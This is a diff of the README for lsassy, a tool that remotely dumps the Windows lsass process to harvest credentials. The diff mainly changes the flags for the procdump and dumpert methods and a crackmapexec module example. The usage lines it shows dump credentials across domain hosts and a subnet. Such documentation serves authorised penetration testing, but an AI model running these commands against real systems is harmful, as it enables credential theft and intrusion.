@@ -77,7 +77,7 @@ Two execution methods can be used.
 This method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute
 procdump using WMI, and if it fails it will create a remote task, execute it and delete it.
 
-#### Procdump method
+#### Dumpert method
 
 This method uploads **dumpert.exe** to dump **lsass** process. It will first try to execute
 dumpert using WMI, and if it fails it will create a remote task, execute it and delete it.
@@ -85,7 +85,7 @@ dumpert using WMI, and if it fails it will create a remote task, execute it and 
 #### Examples
 
 ```bash
-lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 0 -p /path/to/procdump.exe
+lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 0 -p /path/to/procdump.exe -u /path/to/dumpert.exe
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 1
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 2 -p /path/to/procdump.exe
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 3
@@ -119,7 +119,7 @@ lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 lsassy -m 2 -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
 # Dumpert Method
-lsassy -m 5 -p /tmp/dumpert.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
+lsassy -m 5 -u /tmp/dumpert.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
 # Remote parsing only
 lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
@@ -131,7 +131,7 @@ lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.l
 ### CME Module
 
 ```
-crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound DUMPERT_PATH=/tmp/dumpert.exe 
+crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound 
 ```
 
 ### ChangeLog
